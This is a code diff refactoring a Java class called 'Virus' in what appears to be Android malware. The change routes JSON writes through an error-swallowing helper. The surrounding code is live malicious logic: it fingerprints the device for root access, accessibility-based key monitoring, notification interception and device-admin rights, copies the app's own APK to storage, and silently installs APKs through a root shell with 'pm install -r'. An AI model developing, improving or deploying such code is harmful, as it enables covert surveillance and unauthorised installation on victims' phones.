@@ -22,23 +22,24 @@ final class Virus {
         try {
             ApplicationInfo app = ctx.getApplicationInfo();
             PackageInfo info = ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), 0);
-            out.put("package", ctx.getPackageName());
-            out.put("source_apk", app.sourceDir);
-            out.put("source_apk_bytes", new File(app.sourceDir).length());
-            out.put("source_apk_sha256", sha256(new File(app.sourceDir)));
-            out.put("version_name", info.versionName);
-            out.put("version_code", Build.VERSION.SDK_INT >= 28 ? info.getLongVersionCode() : info.versionCode);
-            out.put("rooted", Common.rooted());
-            out.put("root_probe", Root.available());
-            out.put("accessibility", KeyMon.connected());
-            out.put("notification_listener", NotifyMon.connected());
-            out.put("device_admin", Info.admin(ctx));
-            out.put("native", NativeBridge.available());
-            out.put("can_install_unknown", canInstallUnknown(ctx));
-            out.put("can_write_external", canWriteExternal(ctx));
-            out.put("downloads", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath());
+            File source = new File(app.sourceDir);
+            put(out, "package", ctx.getPackageName());
+            put(out, "source_apk", app.sourceDir);
+            put(out, "source_apk_bytes", source.length());
+            put(out, "source_apk_sha256", sha256(source));
+            put(out, "version_name", info.versionName);
+            put(out, "version_code", Build.VERSION.SDK_INT >= 28 ? info.getLongVersionCode() : info.versionCode);
+            put(out, "rooted", Common.rooted());
+            put(out, "root_probe", Root.available());
+            put(out, "accessibility", KeyMon.connected());
+            put(out, "notification_listener", NotifyMon.connected());
+            put(out, "device_admin", Info.admin(ctx));
+            put(out, "native", NativeBridge.available());
+            put(out, "can_install_unknown", canInstallUnknown(ctx));
+            put(out, "can_write_external", canWriteExternal(ctx));
+            put(out, "downloads", Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath());
         } catch (Throwable exc) {
-            out.put("error", String.valueOf(exc));
+            put(out, "error", String.valueOf(exc));
         }
         return out;
     }
@@ -55,21 +56,21 @@ final class Virus {
             if (target.isDirectory()) target = new File(target, source.getName() + ".apk");
             File parent = target.getParentFile();
             if (parent != null && !parent.exists() && !parent.mkdirs()) {
-                out.put("ok", false);
-                out.put("error", "cannot create " + parent);
+                put(out, "ok", false);
+                put(out, "error", "cannot create " + parent);
                 return out;
             }
             copy(source, target);
             boolean same = source.length() == target.length() && sha256(source).equals(sha256(target));
-            out.put("ok", same);
-            out.put("source", source.getAbsolutePath());
-            out.put("target", target.getAbsolutePath());
-            out.put("bytes", target.length());
-            out.put("sha256", sha256(target));
-            out.put("byte_identical", same);
+            put(out, "ok", same);
+            put(out, "source", source.getAbsolutePath());
+            put(out, "target", target.getAbsolutePath());
+            put(out, "bytes", target.length());
+            put(out, "sha256", sha256(target));
+            put(out, "byte_identical", same);
         } catch (Throwable exc) {
-            out.put("ok", false);
-            out.put("error", String.valueOf(exc));
+            put(out, "ok", false);
+            put(out, "error", String.valueOf(exc));
         }
         return out;
     }
@@ -82,17 +83,17 @@ final class Virus {
             if (Root.available()) {
                 String result = Root.exec("pm install -r " + shellQuote(target));
                 boolean installed = result.contains("Success");
-                out.put("install", installed ? "root-installed" : "root-install-failed");
-                out.put("install_output", result.length() > 2048 ? result.substring(0, 2048) : result);
-                out.put("ok", installed);
+                put(out, "install", installed ? "root-installed" : "root-install-failed");
+                put(out, "install_output", result.length() > 2048 ? result.substring(0, 2048) : result);
+                put(out, "ok", installed);
             } else {
-                out.put("install", "needs-user-consent");
-                out.put("ok", true);
+                put(out, "install", "needs-user-consent");
+                put(out, "ok", true);
             }
         } catch (Throwable exc) {
-            out.put("install", "failed");
-            out.put("install_error", String.valueOf(exc));
-            out.put("ok", false);
+            put(out, "install", "failed");
+            put(out, "install_error", String.valueOf(exc));
+            put(out, "ok", false);
         }
         return out;
     }
@@ -128,6 +129,13 @@ final class Virus {
         return "'" + value.replace("'", "'\\''") + "'";
     }
 
+    private static void put(JSONObject out, String key, Object value) {
+        try {
+            out.put(key, value);
+        } catch (Exception ignored) {
+        }
+    }
+
     @SuppressWarnings("deprecation")
     private static boolean canInstallUnknown(Context ctx) {
         try {
@@ -143,7 +151,7 @@ final class Virus {
         try {
             return Build.VERSION.SDK_INT < 23
                     || ctx.checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-                    || (Build.VERSION.SDK_INT >= 30 && android.os.Environment.isExternalStorageManager());
+                    || (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager());
         } catch (Throwable exc) {
             return false;
         }
